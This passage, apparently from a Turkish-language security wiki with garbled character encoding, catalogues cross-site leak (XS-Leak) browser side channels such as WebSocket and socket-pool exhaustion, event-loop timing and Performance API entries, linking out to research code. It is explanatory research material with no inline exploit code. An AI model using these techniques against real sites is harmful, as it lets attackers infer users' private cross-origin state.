* **AlgÄ±lanabilir Fark**: API KullanÄ±mÄ±
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Ã–zet**: WebSocket baÄŸlantÄ± sÄ±nÄ±rÄ±nÄ± tÃ¼ketmek, Ã§apraz kÃ¶kenli bir sayfanÄ±n WebSocket baÄŸlantÄ±larÄ±nÄ±n sayÄ±sÄ±nÄ± sÄ±zdÄ±rÄ±r.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Hedef sayfanÄ±n kaÃ§ **WebSocket baÄŸlantÄ±sÄ± kullandÄ±ÄŸÄ±nÄ±** ve nasÄ±l kullandÄ±ÄŸÄ±nÄ± belirlemek mÃ¼mkÃ¼ndÃ¼r. Bu, bir saldÄ±rganÄ±n uygulama durumlarÄ±nÄ± tespit etmesine ve WebSocket baÄŸlantÄ±larÄ±nÄ±n sayÄ±sÄ±yla iliÅŸkili bilgileri sÄ±zdÄ±rmasÄ±na olanak tanÄ±r.

Bir **kÃ¶ken**, baÄŸlantÄ±larÄ±nÄ±n durumlarÄ±na bakÄ±lmaksÄ±zÄ±n, **maksimum miktarda WebSocket** baÄŸlantÄ± nesnesini kullandÄ±ÄŸÄ±nda, yeni nesnelerin oluÅŸturulmasÄ± **JavaScript istisnalarÄ±na neden olur**. Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in, saldÄ±rgan web sitesi hedef web sitesini bir aÃ§Ä±lÄ±r pencerede veya iframe iÃ§inde aÃ§ar ve hedef web sitesi yÃ¼klendikten sonra, mÃ¼mkÃ¼n olan en fazla WebSocket baÄŸlantÄ±sÄ±nÄ± oluÅŸturmaya Ã§alÄ±ÅŸÄ±r. **AtÄ±lan istisnalarÄ±n sayÄ±sÄ±**, hedef web sitesi penceresi tarafÄ±ndan kullanÄ±lan **WebSocket baÄŸlantÄ±larÄ±nÄ±n sayÄ±sÄ±dÄ±r**.

### Ã–deme API

* **Dahil Etme YÃ¶ntemleri**: Frames, AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: API KullanÄ±mÄ±
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Ã–zet**: YalnÄ±zca bir Ã¶deme isteÄŸinin aynÄ± anda etkin olabileceÄŸini belirleyin.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Bu XS-Leak, bir saldÄ±rganÄ±n **Ã§apraz kÃ¶kenli bir sayfanÄ±n bir Ã¶deme isteÄŸi baÅŸlattÄ±ÄŸÄ±nÄ± algÄ±lamasÄ±na** olanak tanÄ±r.

Ã‡Ã¼nkÃ¼ **yalnÄ±zca bir Ã¶deme isteÄŸi aynÄ± anda etkin olabilir**, hedef web sitesi Ã–deme Ä°steÄŸi API'sÄ±nÄ± kullanÄ±yorsa, bu API'yi kullanmaya yÃ¶nelik **diÄŸer giriÅŸimler baÅŸarÄ±sÄ±z olacak** ve bir **JavaScript istisnasÄ±na** neden olacaktÄ±r. SaldÄ±rgan, bu durumu istismar ederek **periyodik olarak Ã–deme API arayÃ¼zÃ¼nÃ¼ gÃ¶stermeye Ã§alÄ±ÅŸabilir**. Bir deneme istisna oluÅŸturursa, hedef web sitesi ÅŸu anda bunu kullanÄ±yor demektir. SaldÄ±rgan, bu periyodik denemeleri hemen oluÅŸturduktan sonra arayÃ¼zÃ¼ kapatÄ±larak gizleyebilir.

### Olay DÃ¶ngÃ¼sÃ¼nÃ¼n ZamanlamasÄ± <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Dahil Etme YÃ¶ntemleri**:
* **AlgÄ±lanabilir Fark**: Zamanlama (Genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Ã–zet:** Tek iplikli JS olay dÃ¶ngÃ¼sÃ¼nÃ¼ kÃ¶tÃ¼ye kullanarak bir web sayfasÄ±nÄ±n yÃ¼rÃ¼tme sÃ¼resini Ã¶lÃ§Ã¼n.
* **Kod Ã–rneÄŸi**:

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript, [tek iplikli bir olay dÃ¶ngÃ¼sÃ¼](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) eÅŸzamanlÄ±lÄ±k modelinde Ã§alÄ±ÅŸÄ±r, bu da **yalnÄ±zca bir gÃ¶revi aynÄ± anda yÃ¼rÃ¼tebileceÄŸi anlamÄ±na gelir**. Bu Ã¶zellik, **farklÄ± kÃ¶kenden gelen kodun ne kadar sÃ¼rede yÃ¼rÃ¼tÃ¼ldÃ¼ÄŸÃ¼nÃ¼ Ã¶lÃ§mek** iÃ§in sÃ¶mÃ¼rÃ¼lebilir. Bir saldÄ±rgan, kendi kodlarÄ±nÄ±n olay dÃ¶ngÃ¼sÃ¼ndeki yÃ¼rÃ¼tme sÃ¼resini sÃ¼rekli olarak sabit Ã¶zelliklere sahip olaylar gÃ¶ndererek Ã¶lÃ§ebilir. Bu olaylar, olay havuzu boÅŸ olduÄŸunda iÅŸlenecektir. DiÄŸer kÃ¶kenlerin de aynÄ± havuza olaylar gÃ¶nderdiÄŸi durumda, bir **saldÄ±rgan, kendi gÃ¶revlerinin yÃ¼rÃ¼tÃ¼lmesindeki gecikmeleri gÃ¶zlemleyerek dÄ±ÅŸ olaylarÄ±n yÃ¼rÃ¼tÃ¼lme sÃ¼resini Ã§Ä±karabilir**. Bu gecikmeleri izlemek iÃ§in olay dÃ¶ngÃ¼sÃ¼nÃ¼ izleme yÃ¶ntemi, farklÄ± kÃ¶kenlerden gelen kodun yÃ¼rÃ¼tme sÃ¼resini ortaya Ã§Ä±karabilir ve hassas bilgileri ortaya Ã§Ä±karabilir.

{% hint style="warning" %}
Bir yÃ¼rÃ¼tme zamanlamasÄ±nda **aÄŸ faktÃ¶rlerini ortadan kaldÄ±rmak** ve **daha kesin Ã¶lÃ§Ã¼mler** elde etmek mÃ¼mkÃ¼ndÃ¼r. Ã–rneÄŸin, sayfayÄ± yÃ¼klemeden Ã¶nce sayfada kullanÄ±lan kaynaklarÄ± yÃ¼kleyerek.
{% endhint %}

### MeÅŸgul Olay DÃ¶ngÃ¼sÃ¼ <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Dahil Etme YÃ¶ntemleri**:
* **AlgÄ±lanabilir Fark**: Zamanlama (Genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Ã–zet:** Bir web iÅŸleminin yÃ¼rÃ¼tme sÃ¼resini Ã¶lÃ§menin bir yolu, bir ipliÄŸin olay dÃ¶ngÃ¼sÃ¼nÃ¼ kasÄ±tlÄ± olarak engelleyerek ve ardÄ±ndan olay dÃ¶ngÃ¼sÃ¼nÃ¼n tekrar eriÅŸilebilir hale gelmesinin ne kadar sÃ¼rdÃ¼ÄŸÃ¼nÃ¼ zamanlamaktÄ±r. Bir olay dÃ¶ngÃ¼sÃ¼ne (uzun bir hesaplama veya senkron API Ã§aÄŸrÄ±sÄ± gibi) engelleyici bir iÅŸlem ekleyerek ve ardÄ±ndan sonraki kodun yÃ¼rÃ¼tmeye baÅŸlamasÄ±nÄ±n ne kadar sÃ¼rdÃ¼ÄŸÃ¼nÃ¼ izleyerek, olay dÃ¶ngÃ¼sÃ¼ sÄ±rasÄ±nda engelleme sÃ¼resince yÃ¼rÃ¼tÃ¼len gÃ¶revlerin sÃ¼resini Ã§Ä±karabilirsiniz. Bu teknik, JavaScript'in olay dÃ¶ngÃ¼sÃ¼nÃ¼n tek iplikli doÄŸasÄ±ndan yararlanÄ±r, burada gÃ¶revler sÄ±ralÄ± olarak yÃ¼rÃ¼tÃ¼lÃ¼r ve aynÄ± ipliÄŸi paylaÅŸan diÄŸer iÅŸlemlerin performansÄ± veya davranÄ±ÅŸÄ± hakkÄ±nda bilgi saÄŸlayabilir.
* **Kod Ã–rneÄŸi**:

Olay dÃ¶ngÃ¼sÃ¼nÃ¼ kilitleyerek yÃ¼rÃ¼tme sÃ¼resini Ã¶lÃ§me tekniÄŸinin Ã¶nemli bir avantajÄ±, **Site Ä°zolasyonu**'nu atlatma potansiyeline sahip olmasÄ±dÄ±r. **Site Ä°zolasyonu**, farklÄ± web sitelerini ayrÄ± iÅŸlemlere ayÄ±ran ve kÃ¶tÃ¼ niyetli sitelerin doÄŸrudan diÄŸer sitelerden hassas verilere eriÅŸmesini engellemeyi amaÃ§layan bir gÃ¼venlik Ã¶zelliÄŸidir. Ancak, baÅŸka bir kÃ¶kenin yÃ¼rÃ¼tme zamanlamasÄ±nÄ± paylaÅŸÄ±lan olay dÃ¶ngÃ¼sÃ¼ aracÄ±lÄ±ÄŸÄ±yla etkileyerek, bir saldÄ±rgan, o kÃ¶kenin etkinlikleri hakkÄ±nda dolaylÄ± olarak bilgi Ã§Ä±karabilir. Bu yÃ¶ntem, diÄŸer kÃ¶kenin verilerine doÄŸrudan eriÅŸime dayanmaz, ancak o kÃ¶kenin etkinliklerinin paylaÅŸÄ±lan olay dÃ¶ngÃ¼sÃ¼ndeki etkisini gÃ¶zlemler ve dolayÄ±sÄ±yla **Site Ä°zolasyonu** tarafÄ±ndan oluÅŸturulan koruyucu bariyerlerden kaÃ§Ä±nÄ±r.

{% hint style="warning" %}
Bir yÃ¼rÃ¼tme zamanlamasÄ±nda **aÄŸ faktÃ¶rlerini ortadan kaldÄ±rmak** ve **daha kesin Ã¶lÃ§Ã¼mler** elde etmek mÃ¼mkÃ¼ndÃ¼r. Ã–rneÄŸin, sayfayÄ± yÃ¼klemeden Ã¶nce sayfada kullanÄ±lan kaynaklarÄ± yÃ¼kleyerek.
{% endhint %}

### BaÄŸlantÄ± Havuzu

* **Dahil Etme YÃ¶ntemleri**: JavaScript Ä°stekleri
* **AlgÄ±lanabilir Fark**: Zamanlama (Genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Ã–zet:** Bir saldÄ±rgan, tÃ¼m soketleri kilitler, hedef web sayfasÄ±nÄ± yÃ¼kler ve aynÄ± anda baÅŸka bir sayfayÄ± yÃ¼kler; son sayfanÄ±n yÃ¼klenmeye baÅŸlamasÄ± hedef sayfanÄ±n yÃ¼klenme sÃ¼residir.
* **Kod Ã–rneÄŸi**:

{% content-ref url="connection-pool-example.md" %}
[connection-pool-example.md](connection-pool-example.md)
{% endcontent-ref %}

TarayÄ±cÄ±lar sunucu iletiÅŸimi iÃ§in soketleri kullanÄ±r, ancak iÅŸletim sistemi ve donanÄ±mÄ±n sÄ±nÄ±rlÄ± kaynaklarÄ± nedeniyle, **tarayÄ±cÄ±lar eÅŸzamanlÄ± soket sayÄ±sÄ±na bir sÄ±nÄ±rlama** getirmek zorundadÄ±r. SaldÄ±rganlar bu sÄ±nÄ±rlamayÄ± aÅŸaÄŸÄ±daki adÄ±mlarla sÃ¶mÃ¼rebilir:

1. TarayÄ±cÄ±nÄ±n soket sÄ±nÄ±rÄ±nÄ± belirleyin, Ã¶rneÄŸin, 256 global soket.
2. BaÄŸlantÄ±larÄ± tamamlamadan aÃ§Ä±k tutacak ÅŸekilde farklÄ± ana bilgisayarlara 255 istek baÅŸlatarak 255 soketi uzun sÃ¼re iÅŸgal edin.
3.
   256. soketi hedef sayfaya bir istek gÃ¶ndermek iÃ§in kullanÄ±n.
4. FarklÄ± bir ana bilgisayara 257. isteÄŸi gÃ¶ndermeye Ã§alÄ±ÅŸÄ±n. TÃ¼m soketlerin kullanÄ±mda olduÄŸu (2. ve 3. adÄ±mlara gÃ¶re) gÃ¶z Ã¶nÃ¼ne alÄ±ndÄ±ÄŸÄ±nda, bu istek bir soket kullanÄ±labilir hale gelene kadar sÄ±raya alÄ±nacaktÄ±r. Bu isteÄŸin devam etmeden Ã¶nceki gecikme, saldÄ±rgana 256. soketle iliÅŸkili aÄŸ etkinliÄŸi hakkÄ±nda zamanlama bilgisi saÄŸlar. Bu Ã§Ä±karÄ±m, 2. adÄ±mdaki 255 soketin hala meÅŸgul olduÄŸunu ve herhangi yeni kullanÄ±labilir soketin 3. adÄ±mdan serbest bÄ±rakÄ±lan soket olmasÄ± gerektiÄŸini ima ettiÄŸinden mÃ¼mkÃ¼ndÃ¼r. 256. soketin kullanÄ±labilir hale gelme sÃ¼resi, dolayÄ±sÄ±yla hedef sayfaya yapÄ±lan isteÄŸin tamamlanmasÄ± iÃ§in gereken sÃ¼re ile doÄŸrudan iliÅŸkilidir.

Daha fazla bilgi iÃ§in: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### BaÄŸlantÄ± Havuzu Hedefe GÃ¶re

* **Dahil Etme YÃ¶ntemleri**: JavaScript Ä°stekleri
* **AlgÄ±lanabilir Fark**: Zamanlama (Genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **Daha Fazla Bilgi**:
* **Ã–zet:** Ã–nceki teknik gibi ancak tÃ¼m soketleri kullanmak yerine, Google **Chrome** aynÄ± kÃ¶kene **6 eÅŸzamanlÄ± istek sÄ±nÄ±rÄ±** koyar. EÄŸer **5'ini bloke eder** ve ardÄ±ndan **6. bir istek baÅŸlatÄ±rsak**, bunu **zamanlayabiliriz** ve **kurban sayfanÄ±n** aynÄ± uca **daha fazla istek gÃ¶ndermesini saÄŸlayarak sayfanÄ±n durumunu algÄ±lamak** iÃ§in **6. istek** daha **uzun sÃ¼recektir** ve bunu algÄ±layabiliriz.

## Performans API Teknikleri

[`Performans API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance), web uygulamalarÄ±nÄ±n performans metriklerine dair iÃ§gÃ¶rÃ¼ler sunar ve bu iÃ§gÃ¶rÃ¼ler [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API) tarafÄ±ndan daha da zenginleÅŸtirilir. Resource Timing API, aÄŸ isteÄŸi zamanlamalarÄ±nÄ±n detaylÄ± izlenmesini saÄŸlar, Ã¶rneÄŸin isteklerin sÃ¼resini. Sunucular, yanÄ±tlarÄ±nda `Timing-Allow-Origin: *` baÅŸlÄ±ÄŸÄ±nÄ± iÃ§erdiÄŸinde, transfer boyutu ve alan arama sÃ¼resi gibi ek veriler eriÅŸilebilir hale gelir.

Bu zengin veri, [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) veya [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName) gibi yÃ¶ntemler aracÄ±lÄ±ÄŸÄ±yla alÄ±nabilir, performansla ilgili bilgilerin kapsamlÄ± bir gÃ¶rÃ¼nÃ¼mÃ¼nÃ¼ saÄŸlar. AyrÄ±ca, API, [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) ile elde edilen zaman damgalarÄ± arasÄ±ndaki farkÄ± hesaplayarak yÃ¼rÃ¼tme sÃ¼relerinin Ã¶lÃ§Ã¼lmesini kolaylaÅŸtÄ±rÄ±r. Ancak, belirli iÅŸlemler iÃ§in Chrome gibi tarayÄ±cÄ±larda `performance.now()`'un hassasiyeti milisaniyelere sÄ±nÄ±rlÄ± olabilir, bu da zamanlama Ã¶lÃ§Ã¼mlerinin ayrÄ±ntÄ±sÄ±nÄ± etkileyebilir.

Zamanlama Ã¶lÃ§Ã¼mlerinin Ã¶tesinde, Performans API, gÃ¼venlikle ilgili iÃ§gÃ¶rÃ¼ler iÃ§in de kullanÄ±labilir. Ã–rneÄŸin, Chrome'da `performance` nesnesinde sayfalarÄ±n varlÄ±ÄŸÄ± veya yokluÄŸu, `X-Frame-Options`'Ä±n uygulanÄ±p uygulanmadÄ±ÄŸÄ±nÄ± gÃ¶sterebilir. Ã–zellikle, bir sayfa `X-Frame-Options` nedeniyle bir Ã§erÃ§evede oluÅŸturulmaktan engellendiÄŸinde, bu sayfa `performance` nesnesinde kaydedilmez, sayfanÄ±n Ã§erÃ§eve politikalarÄ± hakkÄ±nda ince bir ipucu saÄŸlar.

### Hata SÄ±zÄ±ntÄ±sÄ±

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler, HTML ElemanlarÄ±
* **AlgÄ±lanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Ã–zet:** Hatalara neden olan bir istek, bir kaynak zamanlama girdisi oluÅŸturmaz.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Bir **hata** oluÅŸturan istekler, bir **performans girdisi oluÅŸturmaz** ve bu nedenle **HTTP yanÄ±t durum kodlarÄ± arasÄ±nda fark yapÄ±labilir**.

### Stil Yeniden YÃ¼kleme HatasÄ±

* **Dahil Etme YÃ¶ntemleri**: HTML ElemanlarÄ±
* **AlgÄ±lanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Ã–zet:** Bir tarayÄ±cÄ± hatasÄ± nedeniyle, hatalara neden olan istekler iki kez yÃ¼klenir.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Ã–nceki teknikte, GC'deki tarayÄ±cÄ± hatalarÄ± nedeniyle **yÃ¼klenemeyen kaynaklarÄ±n iki kez yÃ¼klendiÄŸi** iki durum belirlendi. Bu, Performans API'da birden fazla giriÅŸ oluÅŸturur ve bu nedenle algÄ±lanabilir.

### Ä°stek BirleÅŸtirme HatasÄ±

* **Dahil Etme YÃ¶ntemleri**: HTML ElemanlarÄ±
* **AlgÄ±lanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Ã–zet:** Hatalara neden olan istekler birleÅŸtirilemez.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Teknik, belirtilen makalede bir tabloda bulundu ancak tekniÄŸin aÃ§Ä±klamasÄ±na rastlanmadÄ±. Bununla birlikte, bu durumu kontrol eden kaynak kodu [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak) adresinde bulabilirsiniz.

### BoÅŸ Sayfa SÄ±zÄ±ntÄ±sÄ±

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Ã–zet:** BoÅŸ yanÄ±tlar, kaynak zamanlama girdileri oluÅŸturmaz.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Bir saldÄ±rgan, bir isteÄŸin boÅŸ bir HTTP yanÄ±t gÃ¶vdesine neden olduÄŸunu tespit edebilir Ã§Ã¼nkÃ¼ **boÅŸ sayfalarÄ±n bazÄ± tarayÄ±cÄ±larda performans girdisi oluÅŸturmadÄ±ÄŸÄ±nÄ±** gÃ¶rebilir.

### **XSS-Auditor SÄ±zÄ±ntÄ±sÄ±**

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Ã–zet:** GÃ¼venlik Bildirimlerinde (SA) XSS Denetleyici kullanÄ±larak, saldÄ±rganlar, oluÅŸturulan yÃ¼klemelerin denetleyicinin filtreleme mekanizmasÄ±nÄ± tetiklediÄŸinde yanÄ±tlarda deÄŸiÅŸiklikler gÃ¶zlemleyerek belirli web sayfasÄ± Ã¶ÄŸelerini tespit edebilirler.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

GÃ¼venlik Bildirimlerinde (SA), XSS Denetleyici, baÅŸlangÄ±Ã§ta Cross-Site Scripting (XSS) saldÄ±rÄ±larÄ±nÄ± Ã¶nlemek iÃ§in tasarlanmÄ±ÅŸ olmasÄ±na raÄŸmen, paradoksal bir ÅŸekilde hassas bilgilerin sÄ±zdÄ±rÄ±lmasÄ±nda kullanÄ±labilir. Bu yerleÅŸik Ã¶zellik Google Chrome (GC) 'dan kaldÄ±rÄ±ldÄ±, ancak SA'da hala mevcut. 2013 yÄ±lÄ±nda, Braun ve Heiderich, XSS Denetleyicinin yanlÄ±ÅŸlÄ±kla meÅŸru betikleri engelleyebileceÄŸini ve yanlÄ±ÅŸ pozitiflere yol aÃ§abileceÄŸini gÃ¶sterdi. Buna dayanarak, araÅŸtÄ±rmacÄ±lar, hassas bilgileri Ã§Ä±karmak ve Ã§apraz kÃ¶kenli sayfalarda belirli iÃ§eriÄŸi tespit etmek iÃ§in teknikler geliÅŸtirdiler, bu kavrama Terada tarafÄ±ndan baÅŸlangÄ±Ã§ta bildirilen ve Heyes tarafÄ±ndan bir blog yazÄ±sÄ±nda ayrÄ±ntÄ±lÄ± olarak aÃ§Ä±klanan XS-SÄ±zÄ±ntÄ±larÄ± olarak bilinir. Bu teknikler GC'deki XSS Denetleyicisi iÃ§in Ã¶zeldi, ancak SA'da, XSS Denetleyicisi tarafÄ±ndan engellenen sayfalarÄ±n Performans API'da giriÅŸ oluÅŸturmadÄ±ÄŸÄ± keÅŸfedildi, bu da hassas bilgilerin hala sÄ±zdÄ±rÄ±labileceÄŸi bir yÃ¶ntemi ortaya koydu.

### X-Frame SÄ±zÄ±ntÄ±sÄ±

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±k
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Ã–zet:** X-Frame-Options baÅŸlÄ±ÄŸÄ±na sahip kaynak, kaynak zamanlama girdisi oluÅŸturmaz.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Bir sayfanÄ±n bir **iframe** iÃ§inde **oluÅŸturulmasÄ±na izin verilmediÄŸinde**, bir **performans girdisi oluÅŸturulmaz**. SonuÃ§ olarak, bir saldÄ±rgan, yanÄ±t baÅŸlÄ±ÄŸÄ± **`X-Frame-Options`**'Ä± tespit edebilir.\
AynÄ± durum **embed** **etiketi kullanÄ±ldÄ±ÄŸÄ±nda da geÃ§erlidir.**

### Ä°ndirme Tespiti

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±k
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Ã–zet:** Ä°ndirmeler, Performans API'da kaynak zamanlama girdisi oluÅŸturmaz.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

TanÄ±mlanan XS-SÄ±zÄ±ntÄ±ya benzer ÅŸekilde, bir **kaynak indirildiÄŸinde** ContentDisposition baÅŸlÄ±ÄŸÄ± nedeniyle, ayrÄ±ca bir **performans girdisi oluÅŸturmaz**. Bu teknik, tÃ¼m bÃ¼yÃ¼k tarayÄ±cÄ±larda Ã§alÄ±ÅŸÄ±r.

### YÃ¶nlendirme BaÅŸlangÄ±Ã§ SÄ±zÄ±ntÄ±sÄ±

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler
* **AlgÄ±lanabilir Fark**: YÃ¶nlendirme
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Ã–zet:** Kaynak zamanlama giriÅŸi bir yÃ¶nlendirme baÅŸlangÄ±Ã§ zamanÄ±nÄ± sÄ±zdÄ±rÄ±r.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

BazÄ± tarayÄ±cÄ±larÄ±n davranÄ±ÅŸlarÄ±nÄ± istismar eden bir XS-Leak Ã¶rneÄŸi bulduk. Standart, Ã§apraz kaynak istekleri iÃ§in belirli Ã¶zniteliklerin sÄ±fÄ±ra ayarlanmasÄ± gerektiÄŸini tanÄ±mlar. Ancak, **SA**'da, hedef sayfa tarafÄ±ndan yÃ¶nlendirilip yÃ¶nlendirilmediÄŸi **Performance API** sorgulanarak ve **redirectStart zamanlama verileri** kontrol edilerek tespit edilebilir.

### YÃ¶nlendirme SÃ¼resi SÄ±zÄ±ntÄ±sÄ±

* **Dahil Etme YÃ¶ntemleri**: Fetch API
* **AlgÄ±lanabilir Fark**: YÃ¶nlendirme
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Ã–zet:** Bir yÃ¶nlendirme gerÃ§ekleÅŸtiÄŸinde zamanlama giriÅŸlerinin sÃ¼resi negatif olur.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

GC'de, bir **yÃ¶nlendirme** ile sonuÃ§lanan isteklerin **sÃ¼resi negatif** olup olmadÄ±ÄŸÄ± **ayÄ±rt edilebilir**.

### CORP SÄ±zÄ±ntÄ±sÄ±

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±k
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Ã–zet:** CORP ile korunan kaynaklar zamanlama giriÅŸi oluÅŸturmaz.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

BazÄ± durumlarda, **nextHopProtocol giriÅŸi** bir sÄ±zÄ±ntÄ± tekniÄŸi olarak kullanÄ±labilir. GC'de, **CORP baÅŸlÄ±ÄŸÄ±** ayarlandÄ±ÄŸÄ±nda, nextHopProtocol **boÅŸ** olacaktÄ±r. CORP etkin kaynaklar iÃ§in SA hiÃ§bir performans giriÅŸi oluÅŸturmayacaktÄ±r.

### Hizmet Ä°ÅŸÃ§isi

* **Dahil Etme YÃ¶ntemleri**: Ã‡erÃ§eveler
* **AlgÄ±lanabilir Fark**: API KullanÄ±mÄ±
* **Daha Fazla Bilgi**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Ã–zet:** Belirli bir kÃ¶kene kayÄ±tlÄ± bir hizmet iÅŸÃ§isinin olup olmadÄ±ÄŸÄ±nÄ± tespit edin.
* **Kod Ã–rneÄŸi**:

Hizmet iÅŸÃ§ileri, bir kÃ¶kende Ã§alÄ±ÅŸan olaya dayalÄ± betik baÄŸlamlarÄ±dÄ±r. Bir web sayfasÄ±nÄ±n arka planÄ±nda Ã§alÄ±ÅŸÄ±rlar ve kaynaklarÄ± **Ã¶n belleÄŸe almak** iÃ§in araya girebilir, deÄŸiÅŸtirebilir ve **Ã¶n belleÄŸe alabilirler** ve Ã§evrimdÄ±ÅŸÄ± web uygulamasÄ± oluÅŸturabilirler.\
Bir **hizmet iÅŸÃ§isi** tarafÄ±ndan **Ã¶n belleÄŸe alÄ±nan bir kaynak** **iframe** aracÄ±lÄ±ÄŸÄ±yla eriÅŸilirse, kaynak **hizmet iÅŸÃ§isi Ã¶nbelleÄŸinden yÃ¼klenecektir**.\
KaynaÄŸÄ±n **hizmet iÅŸÃ§isi Ã¶nbelleÄŸinden yÃ¼klendiÄŸini** tespit etmek iÃ§in **Performance API** kullanÄ±labilir.\
